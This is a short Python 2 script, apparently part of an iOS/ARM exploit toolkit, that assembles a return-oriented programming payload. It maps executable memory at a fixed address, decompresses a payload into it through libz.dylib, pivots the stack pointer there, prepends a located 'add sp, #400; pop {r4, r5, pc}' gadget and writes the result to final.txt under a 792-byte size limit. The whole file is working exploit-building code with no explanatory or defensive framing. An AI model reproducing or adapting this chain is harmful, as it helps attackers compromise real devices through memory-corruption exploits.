#!/opt/local/bin/python2.6
import sys, base64, shlex, zlib
import dmini
from world1 import *
import goo

output = open('output.txt').read()
outputz = zlib.compress(output)

if len(sys.argv) != 3:
    print >> sys.stderr, "usage: python stub.py -c cache"
    sys.exit(1)

dmini.init(sys.argv[1:])

init('R4', 'R5', 'PC')
make_avail()

PROT_READ, PROT_WRITE, PROT_EXEC = 4, 2, 1
MAP_ANON, MAP_FIXED, MAP_SHARED = 0x1000, 0x0010, 1

funcall('_mmap', 0x11000000, len(output), PROT_READ | PROT_WRITE, MAP_ANON | MAP_FIXED | MAP_SHARED, -1 % (2**32), 0, 0)

dmini.cur.choose_file('/usr/lib/libz.dylib')
funcall('_uncompress', 0x11000000, ptrI(len(output)), ptr(outputz), len(outputz))

set_r0_to(0xfefe0000 + 0x624) # offset from decoder to where we need to set SP to

fancy_set_sp_to(0x11000000)

final = finalize(0xfefe0000)

# add sp, #400; pop {r4, r5, pc}
parse_callback = dmini.cur.find_basic('+ 64 b0 30 bd')
final = struct.pack('I', parse_callback) + final

open('final.txt', 'w').write(final)

print 'len(output) = %d/792' % len(output)
print 'len(final) = %d/792' % (len(final) - 4)
